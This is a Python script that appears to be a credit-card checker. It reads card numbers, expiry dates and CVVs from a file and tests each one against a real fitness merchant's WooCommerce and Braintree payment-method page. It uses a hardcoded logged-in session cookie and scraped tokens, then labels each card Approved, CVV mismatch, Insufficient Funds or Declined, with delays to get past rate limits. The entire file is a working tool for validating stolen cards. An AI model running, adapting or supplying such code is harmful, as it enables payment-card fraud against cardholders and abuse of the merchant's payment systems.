import requests,re,base64,random,os,time
from user_agent import generate_user_agent
from colorama import Fore
os.system('clear')
blue=Fore.BLUE;green=Fore.LIGHTGREEN_EX;red=Fore.RED;white=Fore.WHITE;yellow=Fore.YELLOW;black=Fore.LIGHTBLACK_EX;light_blue=Fore.LIGHTBLUE_EX;purble=Fore.LIGHTMAGENTA_EX;Baby_Blue=Fore.LIGHTCYAN_EX
for P in open("Raven.txt","r"):
    n = P.split('|')[0]
    mm=P.split('|')[1]
    if int(mm) == 12 or int(mm) == 11 or int(mm) == 10:
    	mm = mm
    elif '0' not in mm:
    	mm = f'0{mm}'
    else:
    	mm = mm
    yy=P.split('|')[2]
    if "20" not in yy:
    	yy = f'20{yy}'
    else:
    	yy = yy
    cvc=P.split('|')[3].replace('\n', '')
    P=P.replace('\n', '')
    user = generate_user_agent()
    device_session_id = "".join(random.choices("1234567890qwertyuiopasdfghjklzxcvbnm",k=32))
    correlation_id = "".join(random.choices("1234567890qwertyuiopasdfghjklzxcvbnm",k=32))
    g1 = "".join(random.choices("1234567890qwertyuiopasdfghjklzxcvbnm",k=8))
    g2 = "".join(random.choices("1234567890qwertyuiopasdfghjklzxcvbnm",k=4))
    g3 = "".join(random.choices("1234567890qwertyuiopasdfghjklzxcvbnm",k=4))
    g4 = "".join(random.choices("1234567890qwertyuiopasdfghjklzxcvbnm",k=4))
    g5 = "".join(random.choices("1234567890qwertyuiopasdfghjklzxcvbnm",k=12))
    sessionId = f"{g1}-{g2}-{g3}-{g4}-{g5}"
    time.sleep(20)
    cookies = {'wordpress_logged_in_4db9712e786886e61cb94442e1ea3aeb': 'rodrick.senger%7C1727230005%7CJZq3qBn0L2onievfAlKCWb0s3uf2E1ow8Ww5J5a05tS%7Cb1a36ce4a2a1ea9b3927cd79d9bb6a5b4789a45947a9d6b0cda9b0be90b6cf40',}
    headers = {
    'authority': 'www.barbellmedicine.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9,ar-AE;q=0.8,ar;q=0.7',
    'referer': 'https://www.barbellmedicine.com/my-account/payment-methods/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': user,}
    response = requests.get('https://www.barbellmedicine.com/my-account/add-payment-method/', cookies=cookies, headers=headers)
    nonce = re.findall('name="woocommerce-add-payment-method-nonce" value="(.*?)"',response.text)[0]
    i0 = response.text.find('wc_braintree_client_token = ["')
    i1 = response.text.find('"]', i0)
    token = response.text[i0 + 30:i1]
    encoded_text = token
    decoded_text = base64.b64decode(encoded_text).decode('utf-8')
    au = re.findall(r'"authorizationFingerprint":"(.*?)"', decoded_text)[0]
    clinet_id = re.findall(r'"clientId":"(.*?)"',decoded_text)[0]
    braintreeClientId = re.findall('"braintreeClientId":"(.*?)"',decoded_text)[0]
    access_token = re.findall('"access_token":"(.*?)"',decoded_text)[0]
    headers = {
    'authority': 'payments.braintree-api.com',
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.9',
    'authorization': f'Bearer {au} ',
    'braintree-version': '2018-05-10',
    'content-type': 'application/json',
    'origin': 'https://assets.braintreegateway.com',
    'referer': 'https://assets.braintreegateway.com/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': user,}

    json_data = {
    'clientSdkMetadata': {
        'source': 'client',
        'integration': 'custom',
        'sessionId': sessionId,
    },
    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
    'variables': {
        'input': {
            'creditCard': {
                'number': n,
                'expirationMonth': mm,
                'expirationYear': yy,
                'cvv': cvc,
                'billingAddress': {
                    'postalCode': '75034',
                    'streetAddress': '11660 Legacy',
                },
            },
            'options': {
                'validate': False,
            },
        },
    },
    'operationName': 'TokenizeCreditCard',
}

    response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)

    token = (response.json()["data"]["tokenizeCreditCard"]["token"])
    headers = {
    'authority': 'www.barbellmedicine.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'max-age=0',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://www.barbellmedicine.com',
    'referer': 'https://www.barbellmedicine.com/my-account/add-payment-method/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': user,}

    data = {
    'payment_method': 'braintree_cc',
    'braintree_cc_nonce_key': token,
    'braintree_cc_device_data': '{"device_session_id":"'+device_session_id+'","fraud_merchant_id":null,"correlation_id":"'+correlation_id+'"}',
    'braintree_cc_3ds_nonce_key': '',
    'braintree_cc_config_data': '{"environment":"production","clientApiUrl":"https://api.braintreegateway.com:443/merchants/5vpcsgbwr3rw39my/client_api","assetsUrl":"https://assets.braintreegateway.com","analytics":{"url":"https://client-analytics.braintreegateway.com/5vpcsgbwr3rw39my"},"merchantId":"5vpcsgbwr3rw39my","venmo":"off","graphQL":{"url":"https://payments.braintree-api.com/graphql","features":["tokenize_credit_cards"]},"braintreeApi":{"accessToken":"'+access_token+'","url":"https://payments.braintree-api.com"},"kount":{"kountMerchantId":null},"challenges":["cvv","postal_code"],"creditCards":{"supportedCardTypes":["MasterCard","Visa","American Express","Discover","UnionPay"]},"threeDSecureEnabled":false,"threeDSecure":null,"androidPay":{"displayName":"Barbell Medicine","enabled":true,"environment":"production","googleAuthorizationFingerprint":"'+au+'","supportedNetworks":["visa","mastercard","amex","discover"]},"paypalEnabled":true,"paypal":{"displayName":"Barbell Medicine","clientId":"'+clinet_id+'","assetsUrl":"https://checkout.paypal.com","environment":"live","environmentNoNetwork":false,"unvettedMerchant":false,"braintreeClientId":"'+braintreeClientId+'","billingAgreementsEnabled":true,"merchantAccountId":"strengthmdgmailcom","payeeEmail":null,"currencyIsoCode":"USD"}}',
    'woocommerce-add-payment-method-nonce': nonce,
    '_wp_http_referer': '/my-account/add-payment-method/',
    'woocommerce_add_payment_method': '1',}

    response = requests.post(
    'https://www.barbellmedicine.com/my-account/add-payment-method/',
    cookies=cookies,
    headers=headers,
    data=data,
)
    text = response.text
    
    try:
        pattern = r'Reason: (.+?)\s*</li>'
        match = re.search(pattern, text)
        if match:
            result = match.group(1)
        else:
            if 'Payment method successfully added.' in text:
                result = green + "1000: Approved" + white
                print(f"~> {Baby_Blue}{n}|{mm}|{yy}|{cvc}{white} :", result)
            elif 'risk_threshold' in text:
                result = "RISK: Retry this BIN later."
                print(f"~> {Baby_Blue}{n}|{mm}|{yy}|{cvc}{white} :", result)
            elif 'Please wait for 20 seconds.' in text:
                result = black + "Try again" + white
                print(f"~> {Baby_Blue}{n}|{mm}|{yy}|{cvc}{white} :", result)
            else:
                result = red + "Error" + white
                print(f"~> {Baby_Blue}{n}|{mm}|{yy}|{cvc}{white} :", result)
                
        if 'avs' in result or '1000: Approved' in result or 'Duplicate' in result or 'Insufficient Funds' in result or "Invalid postal code or street address." in result or "postal" in result :
            print(f"~> {Baby_Blue}{n}|{mm}|{yy}|{cvc}{white} :", green+result,white)
        elif 'risk_threshold' in result:
        	result = black + "RISK: Retry this BIN later." + black
        	print(f"~> {Baby_Blue}{n}|{mm}|{yy}|{cvc}{white} :", result)
        elif "CVV" in result or "cvv" in result:
        	result = blue + "Cnn" + white
        	print(f"~> {Baby_Blue}{n}|{mm}|{yy}|{cvc}{white} :", result)
        else:
            print(f"~> {Baby_Blue}{n}|{mm}|{yy}|{cvc}{white} :", result)
    except:
        print(f"~> {Baby_Blue}{n}|{mm}|{yy}|{cvc}{white} :", f'{red}Declined{white}')        
